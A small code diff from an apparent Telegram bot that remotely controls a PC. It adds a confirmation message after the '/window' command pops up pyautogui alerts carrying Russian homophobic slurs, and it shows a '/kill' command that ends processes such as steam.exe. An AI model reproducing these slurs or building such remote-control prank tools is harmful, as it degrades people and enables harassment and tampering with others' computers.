@@ -43,6 +43,7 @@ def commands(message):
         elif message.text == '/window':
                 pyautogui.alert("Ты пидор", "Тест", button="да")
                 pyautogui.alert("Ты гей", "Тест", button="да")
+                bot.send_message(message.chat.id,'Окна с тестом на гея созданы')
                 
         elif message.text == '/kill':
                 bot.send_message(message.chat.id,'Какой процесс хотите убить(steam.exe)')
